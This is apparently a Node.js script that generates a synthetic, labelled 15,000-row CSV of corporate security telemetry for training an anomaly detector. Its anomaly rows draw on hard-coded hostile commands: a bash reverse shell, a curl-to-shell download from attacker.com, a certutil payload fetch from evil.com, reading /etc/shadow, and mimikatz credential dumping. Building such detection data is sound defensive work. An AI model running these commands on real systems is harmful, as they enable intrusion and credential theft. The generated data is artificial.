const fs = require('fs');
const path = require('path');

const targetPath = path.join(process.cwd(), 'ml', 'datasets', 'cybersecurity_15k_dataset.csv');

// Seeded PRNG for deterministic, reproducible generation
function createRng(seed = 42) {
  let s = seed;
  return function() {
    s = (s * 16807 + 0) % 2147483647;
    return (s - 1) / 2147483646;
  };
}

const rng = createRng(1337);

const users = [
  { id: 'usr-101', name: 'alice.vance', dept: 'ENGINEERING', ip: '10.0.4.12' },
  { id: 'usr-102', name: 'bob.martinez', dept: 'FINANCE', ip: '10.0.5.45' },
  { id: 'usr-103', name: 'carol.zhang', dept: 'HR', ip: '10.0.2.88' },
  { id: 'usr-104', name: 'david.kim', dept: 'SALES', ip: '10.0.7.19' },
  { id: 'usr-105', name: 'elena.rostova', dept: 'SECURITY', ip: '10.0.9.3' },
  { id: 'usr-106', name: 'frank.miller', dept: 'IT', ip: '10.0.1.50' },
  { id: 'usr-107', name: 'grace.hopper', dept: 'ENGINEERING', ip: '10.0.4.77' },
  { id: 'usr-108', name: 'henry.todd', dept: 'FINANCE', ip: '10.0.5.12' },
  { id: 'usr-109', name: 'isabella.rossi', dept: 'LEGAL', ip: '10.0.3.33' },
  { id: 'usr-110', name: 'jack.bauer', dept: 'EXECUTIVE', ip: '10.0.8.5' }
];

const normalDestinations = [
  'internal-portal.corp',
  'gitlab.corp.internal',
  'jira.corp.internal',
  'sharepoint.corp.internal',
  'api.github.com',
  'docs.google.com',
  'aws.us-east-1.internal'
];

const suspiciousDestinations = [
  'mega-upload-cloud.ru',
  'c2-beacon-185.xyz',
  'pastebin-raw.io',
  'temp-dropzone.cc',
  'tunnel-ngrok.io',
  'darknet-gateway.to'
];

const normalShells = ['none', 'git status', 'npm test', 'docker ps', 'cat README.md', 'code .', 'python script.py'];
const maliciousShells = [
  'powershell -ExecutionPolicy Bypass -enc SQBFAFg...',
  'bash -i >& /dev/tcp/185.220.101.4/4444 0>&1',
  'sudo cat /etc/shadow',
  'mimikatz.exe privilege::debug sekurlsa::logonpasswords',
  'chmod 777 /var/run/docker.sock',
  'curl -s http://attacker.com/mal.sh | sh',
  'certutil -urlcache -split -f http://evil.com/payload.exe'
];

const header = 'timestamp,user_id,username,department,ip_address,event_type,failed_login_attempts,files_affected,usb_bluetooth_usage,bytes_sent_kb,bytes_received_kb,destination_site,application_shell_cmd,status,is_anomaly,action,details\n';
const writeStream = fs.createWriteStream(targetPath);
writeStream.write(header);

const totalRows = 15000;
let anomalyCount = 0;

// Base date: March 1, 2026
const baseTime = new Date('2026-03-01T08:00:00Z').getTime();

for (let i = 0; i < totalRows; i++) {
  const user = users[Math.floor(rng() * users.length)];
  const isAnomaly = rng() < 0.086 ? 1 : 0; // ~8.6% anomaly rate
  if (isAnomaly) anomalyCount++;

  const timeOffsetMs = Math.floor(i * (30 * 24 * 3600 * 1000 / totalRows) + (rng() * 60000));
  const eventDate = new Date(baseTime + timeOffsetMs);

  let eventType, failedLogins, filesAffected, usbUsage, bytesSent, bytesReceived, dest, cmd, status, action, details;

  if (isAnomaly === 0) {
    const eventTypes = ['FILE_ACCESS', 'NETWORK_CONNECTION', 'FILE_DOWNLOAD', 'LOGIN', 'API_REQUEST'];
    eventType = eventTypes[Math.floor(rng() * eventTypes.length)];
    failedLogins = rng() < 0.04 ? 1 : 0;
    filesAffected = Math.floor(rng() * 5);
    usbUsage = rng() < 0.01 ? 1 : 0;
    bytesSent = Math.round((5 + rng() * 250) * 10) / 10;
    bytesReceived = Math.round((20 + rng() * 1200) * 10) / 10;
    dest = normalDestinations[Math.floor(rng() * normalDestinations.length)];
    cmd = normalShells[Math.floor(rng() * normalShells.length)];
    status = 'SUCCESS';
    action = 'ALLOW';
    details = 'Standard baseline telemetry activity';
  } else {
    const scenario = Math.floor(rng() * 5);
    if (scenario === 0) {
      eventType = 'LOGIN';
      failedLogins = Math.floor(4 + rng() * 9);
      filesAffected = 0;
      usbUsage = 0;
      bytesSent = Math.round((2 + rng() * 15) * 10) / 10;
      bytesReceived = Math.round((5 + rng() * 20) * 10) / 10;
      dest = 'auth-sso.corp.internal';
      cmd = 'none';
      status = rng() < 0.7 ? 'FAILURE' : 'BLOCKED';
      action = 'BLOCK';
      details = 'Repeated authentication failure sequence: ' + failedLogins + ' consecutive attempts';
    } else if (scenario === 1) {
      eventType = 'FILE_DOWNLOAD';
      failedLogins = 0;
      filesAffected = Math.floor(40 + rng() * 250);
      usbUsage = 0;
      bytesSent = Math.round((45000 + rng() * 280000) * 10) / 10;
      bytesReceived = Math.round((100 + rng() * 500) * 10) / 10;
      dest = suspiciousDestinations[Math.floor(rng() * suspiciousDestinations.length)];
      cmd = 'curl -X POST --data-binary @archive.tar.gz';
      status = rng() < 0.4 ? 'SUCCESS' : 'BLOCKED';
      action = status === 'SUCCESS' ? 'ALERT' : 'QUARANTINE';
      details = 'Mass file exfiltration velocity to external site (' + filesAffected + ' files)';
    } else if (scenario === 2) {
      eventType = 'USB_ACTIVITY';
      failedLogins = 0;
      filesAffected = Math.floor(15 + rng() * 80);
      usbUsage = 1;
      bytesSent = Math.round((25000 + rng() * 95000) * 10) / 10;
      bytesReceived = Math.round((50 + rng() * 200) * 10) / 10;
      dest = 'local_usb_drive_D:';
      cmd = 'none';
      status = 'SUCCESS';
      action = 'ALERT';
      details = 'Unsanctioned USB mass storage write operation detected';
    } else if (scenario === 3) {
      eventType = 'SHELL_EXECUTION';
      failedLogins = rng() < 0.3 ? 2 : 0;
      filesAffected = Math.floor(1 + rng() * 10);
      usbUsage = 0;
      bytesSent = Math.round((10 + rng() * 400) * 10) / 10;
      bytesReceived = Math.round((20 + rng() * 500) * 10) / 10;
      dest = suspiciousDestinations[Math.floor(rng() * suspiciousDestinations.length)];
      cmd = maliciousShells[Math.floor(rng() * maliciousShells.length)];
      status = 'BLOCKED';
      action = 'QUARANTINE';
      details = 'Unauthorized shell command execution attempt';
    } else {
      eventType = 'NETWORK_CONNECTION';
      failedLogins = 1;
      filesAffected = Math.floor(5 + rng() * 30);
      usbUsage = 0;
      bytesSent = Math.round((1200 + rng() * 8000) * 10) / 10;
      bytesReceived = Math.round((5000 + rng() * 15000) * 10) / 10;
      dest = 'c2-beacon-185.xyz';
      cmd = 'nc -v 185.220.101.4 443';
      status = 'BLOCKED';
      action = 'QUARANTINE';
      details = 'Outbound egress probe to adversary C2 infrastructure';
    }
  }

  const safeDest = dest.includes(',') ? ('"' + dest + '"') : dest;
  const safeCmd = cmd.includes(',') ? ('"' + cmd + '"') : cmd;
  const safeDetails = details.includes(',') ? ('"' + details + '"') : details;

  const row = [
    eventDate.toISOString(),
    user.id,
    user.name,
    user.dept,
    user.ip,
    eventType,
    failedLogins,
    filesAffected,
    usbUsage,
    bytesSent,
    bytesReceived,
    safeDest,
    safeCmd,
    status,
    isAnomaly,
    action,
    safeDetails
  ].join(',') + '\n';

  writeStream.write(row);
}

writeStream.end(() => {
  console.log('Dataset written successfully to: ' + targetPath);
  console.log('Total rows: ' + totalRows);
  console.log('Anomalies: ' + anomalyCount + ' (' + (anomalyCount / totalRows * 100).toFixed(2) + '%)');
  console.log('Normal: ' + (totalRows - anomalyCount) + ' (' + ((totalRows - anomalyCount) / totalRows * 100).toFixed(2) + '%)');
});
